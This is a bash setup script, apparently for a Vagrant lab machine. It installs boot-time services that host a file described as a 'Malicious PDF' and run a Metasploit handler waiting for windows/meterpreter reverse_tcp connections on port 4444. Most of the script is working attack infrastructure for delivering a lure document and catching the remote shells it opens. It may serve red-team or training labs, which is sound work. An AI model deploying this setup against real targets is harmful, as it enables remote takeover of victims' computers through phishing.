#!/bin/bash
# Setup automatic HTTP server and Metasploit listener on boot

echo "Setting up automatic services on boot..."

# Ensure .msf4/local directory exists
mkdir -p /home/vagrant/.msf4/local

# Create systemd service file
sudo tee /etc/systemd/system/pdf-server.service > /dev/null << 'EOF'
[Unit]
Description=Malicious PDF HTTP Server
After=network.target sys-subsystem-net-devices-eth1.device
Wants=sys-subsystem-net-devices-eth1.device
BindsTo=sys-subsystem-net-devices-eth1.device

[Service]
Type=simple
User=vagrant
WorkingDirectory=/home/vagrant/.msf4/local
# Bind only to host-only interface (192.168.56.101) on eth1
ExecStart=/usr/bin/python3 -m http.server 8080 --bind 192.168.56.101
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable the service (will start on boot)
sudo systemctl daemon-reload
sudo systemctl enable pdf-server.service

# Try to start now if PDF exists
if [ -f "/home/vagrant/.msf4/local/JOAN-ESPINACH-TRD.pdf" ]; then
    sudo systemctl start pdf-server.service

    # Wait a moment and check status
    sleep 2
    if sudo systemctl is-active --quiet pdf-server.service; then
        echo "✓ HTTP server started successfully on port 8080"
        echo "  PDF URL: http://192.168.56.101:8080/JOAN-ESPINACH-TRD.pdf"
    else
        echo "⚠ HTTP server failed to start, but will start on next boot"
    fi
else
    echo "⚠ PDF not found yet, HTTP server will start on next boot"
    echo "  Service enabled and will start automatically"
fi

echo ""
echo "Setting up automatic Metasploit listener..."

# Create directory for Metasploit configuration
sudo mkdir -p /etc/metasploit

# Initialize Metasploit database as vagrant user if needed
echo "  Initializing Metasploit database..."
sudo -u vagrant msfdb init 2>/dev/null || echo "  Database already initialized or initialization skipped"

# Create Metasploit resource script for the listener
sudo tee /etc/metasploit/listener.rc > /dev/null << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
set ReverseListenerBindAddress 192.168.56.101
set ExitOnSession false
set SessionCommunicationTimeout 300
set EnableStageEncoding true
exploit -j -z

# Keep console alive with infinite loop - prevents msfconsole from exiting
puts "[*] Listener started. Press Ctrl+C to stop."
loop do
  sleep 60
end
EOF

# Create systemd service for Metasploit listener
sudo tee /etc/systemd/system/metasploit-listener.service > /dev/null << 'EOF'
[Unit]
Description=Metasploit Listener for PDF Exploit
After=network.target sys-subsystem-net-devices-eth1.device
Wants=sys-subsystem-net-devices-eth1.device
BindsTo=sys-subsystem-net-devices-eth1.device

[Service]
Type=simple
User=vagrant
Environment="HOME=/home/vagrant"
# Bind explicitly to host-only interface eth1 (192.168.56.101:4444)
ExecStart=/usr/bin/msfconsole -q -r /etc/metasploit/listener.rc
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
StandardInput=null
# Prevent OOM killer from stopping the service
OOMScoreAdjust=-900

[Install]
WantedBy=multi-user.target
EOF

# Enable the Metasploit listener service
sudo systemctl daemon-reload
sudo systemctl enable metasploit-listener.service

# Start the listener now
sudo systemctl start metasploit-listener.service

# Wait for Metasploit to initialize (takes longer than other services)
echo "  Waiting for Metasploit listener to start (this may take 20-30 seconds)..."
sleep 15

# Check if listener is running
if sudo systemctl is-active --quiet metasploit-listener.service; then
    echo "✓ Metasploit listener service is running"
    echo "  Listening on: 192.168.56.101:4444"
    echo "  Check status: sudo systemctl status metasploit-listener"
    echo "  View logs: sudo journalctl -u metasploit-listener -f"

    # Verify port is actually listening (may take additional time)
    echo "  Waiting for port 4444 to become available..."
    PORT_READY=0
    for i in {1..20}; do
        if sudo ss -tuln | grep -q ":4444 "; then
            echo "✓ Port 4444 is listening and ready for connections"
            PORT_READY=1
            break
        fi
        sleep 2
    done

    if [ $PORT_READY -eq 0 ]; then
        echo "⚠ WARNING: Port 4444 not detected after 40 seconds"
        echo "  The listener may still be initializing. Check logs:"
        echo "  sudo journalctl -u metasploit-listener -f"
    fi
else
    echo "⚠ WARNING: Metasploit listener service failed to start"
    echo "  Check logs for errors:"
    echo "  sudo journalctl -u metasploit-listener -xe"
    echo ""
    echo "  Common issues:"
    echo "  - Metasploit database not initialized (run: sudo msfdb init)"
    echo "  - Permission issues with /home/vagrant/.msf4"
    echo "  - Port 4444 already in use"
fi

echo ""
echo "═══════════════════════════════════════════════════════════"
echo "  Autostart Configuration Complete"
echo "═══════════════════════════════════════════════════════════"
echo ""
echo "Services configured:"
echo "  • HTTP Server:         192.168.56.101:8080"
echo "  • Metasploit Listener: 192.168.56.101:4444"
echo ""
echo "Both services will start automatically on boot."
